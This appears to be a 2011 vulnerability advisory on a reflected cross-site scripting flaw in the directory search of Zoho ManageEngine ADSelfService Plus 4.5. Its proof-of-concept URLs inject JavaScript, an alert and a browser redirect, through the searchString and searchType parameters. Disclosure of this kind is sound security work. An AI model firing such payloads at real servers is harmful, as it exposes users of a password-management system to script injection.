Subject: Cross-Site Scripting Vuln in Zoho ManageEngine
	ADSelfServicePlus

Vulnerability ID: VRPTH-2011-001
Reference: http://jameswebb.me/vulns/vrpth-2011-001.txt

Vulnerability Summary
======================
Non-persistent XSS  in Zoho ManageEngine ADSelfService Plus

Test Environment
=================
Windows 2008RC2 fully patched.
ManageEngine ADSelfServicePlus version 4.5 Build 4521 installed.
Integrated Into TestDomain

Technical Details
=====================
Corporate Directory Search feature in ManageEngine ADSelfServicePlus
version 4.5 Build 4521 is susceptible to non-persistent XSS attacks.
These vulnerabilities are manifest by the
ability for attacker to terminate javascript variable declarations,
escape encapsulation, and append arbitrary javascript code.
ADSelfService Plus is a password management application for Active
Directory environments.


Proof of Concept
===================
Double-Quote String Termination
HTTP Request =
https://serverip:port/EmployeeSearch.cc?searchType=contains&searchBy=ALL_FIELDS&searchString=";alert("XSS");//\"

Response Source View
<script language="javascript">
var searchValue = "';alert(XSS)//\"";

Single-Quote String Termination
Similarly...
HTTP Request=
https://serverip:port/EmployeeSearch.cc?searchType=';document.location="http://www.cnn.com";//\"&searchBy=ALL_FIELDS&searchString=Bob

Root Cause Analysis
=====================
Input is not being escaped/filtered prior to javascript variable assignment.
